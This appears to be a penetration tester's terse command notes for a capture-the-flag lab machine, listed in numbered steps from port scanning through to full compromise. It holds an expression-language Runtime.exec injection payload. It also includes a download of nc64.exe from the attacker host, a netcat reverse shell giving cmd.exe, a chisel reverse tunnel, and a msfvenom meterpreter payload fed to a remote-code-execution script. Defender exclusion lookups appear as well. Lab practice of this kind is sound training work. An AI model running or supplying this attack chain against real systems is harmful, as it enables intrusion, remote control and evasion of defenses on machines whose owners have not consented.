==========(1)======================================================================================================================
ping -c 5 10.10.11.11
//returns 127 ttl, which means the target is likely windows, so can try with
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.11

/*
Alternatively
ports=$(nmap -p- --min-rate=2000 -T4 10.129.10.10 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV -Pn 10.129.10.10
*/
==========(2)======================================================================================================================
nc 10.10.11.115 9999

/*
Output:
Welcome Brankas Application.
Username:      
Password: NULL
Username or Password incorrect
*/
==========(3)======================================================================================================================
Launch http://10.129.10.10:8000/

gobuster dir -q -u http://10.129.10.10 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
==========(4)======================================================================================================================
feroxbuster -u http://10.129.10.10 -x php,asp,aspx
feroxbuster -u 'http://10.129.10.10/maintenance/..;' -x jsp

/* or
curl -I "http://10.129.10.10/maintenance/"
curl -v "http://10.129.10.10/maintenance/..;"
curl -v "http://10.129.10.10/maintenance/..;/nxstartup.faces"
http://10.129.96.116/maintenance/..;/login.jsp
*/
==========(5)======================================================================================================================
https://raw.githubusercontent.com/ajiththomas/python/refs/heads/main/nexusRCE2.py

/* or
host:
curl 'http://10.10.14.34/maintenance/..;/login.jsp/pwn$%7b-7+7%7d.xhtml'
${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime", null).invoke(null, null).exec("ping 10.10.14.6", null).waitFor()}

curl 'http://10.10.14.34/maintenance/..;/login.jsp/pwn${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime", null).invoke(null, null).exec("ping 10.10.14.6", null).waitFor()}.xhtml'

//sudo tcpdump -ni tun0 icmp
sudo tcpdump -ni tun0 icmp -w capture.pcap
sudo tcpdump -ni tun0 tcp port 5001
sudo tcpdump -ni tun0 udp port 5001


*/
==========(6)======================================================================================================================
target:
icacls .
curl http://10.10.14.34:8000/nc64.exe -o nc64.exe
nc64.exe 10.10.14.34 8001 -e cmd.exe

host:
nc64.exe 10.10.14.34 8001 -e cmd.exe
nc -nvlp 8001
nc64.exe 10.10.14.34 8001 -e cmd.exe
==========(7)======================================================================================================================
dir /p/w
ipconfig
/*powershell
netstat -nat | Select-String LISTEN
netstat -nat | ForEach-Object { $_ } | Where-Object { $_ -match "LISTEN" }
Get-NetTCPConnection | Where-Object { $_.State -eq "Listen" }
*/

netstat -nat | findstr "LISTEN"
==========(8)======================================================================================================================

reg query 'HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths'  
dir 'C:\Program Files (x86)'


/*
HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths
HKLM: Refers to the "HKEY_LOCAL_MACHINE" hive, which contains configuration information specific to the computer (not user-specific).
Windows Defender\Exclusions\Paths: This registry key lists file paths excluded from Windows Defenderâ€™s real-time scanning. 
Anything listed here will not be monitored for malicious activity by Defender.
*/
==========(9)======================================================================================================================
uname -a
cat /etc/os-release
/*
x86_64: 64-bit architecture (amd64)
i386 or i686: 32-bit architecture (386)
armv7l: ARM 32-bit
aarch64: ARM 64-bit
*/

echo %PROCESSOR_ARCHITECTURE%
//systeminfo | findstr /B /C:"System Type"
/powershell -> Get-ComputerInfo | Select-Object CsSystemType
==========(10)======================================================================================================================

/* compile chisel
git clone https://github.com/jpillora/chisel.git
cd chisel
GOOS=windows GOARCH=amd64
//win32
//GOOS=windows GOARCH=386 go build -o chisel.exe
//win64
//GOOS=windows GOARCH=amd64 go build -o chisel.exe
go build -o chisel.exe
file chisel.exe
*/
==========(11)======================================================================================================================
Server:
./chisel server --reverse -p 1234

client:
\chisel.exe client 10.10.10.11:1234 R:9512:127.0.0.1:9512
==========(12)======================================================================================================================
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-port> -f exe -o payload.exe
https://raw.githubusercontent.com/ajiththomas/python/refs/heads/main/unifiedRemoteCodeExecution.py

python3 unifiedRemoteCodeExecution.py <target-ip> <local-http-ip> payload.exe
==========()======================================================================================================================
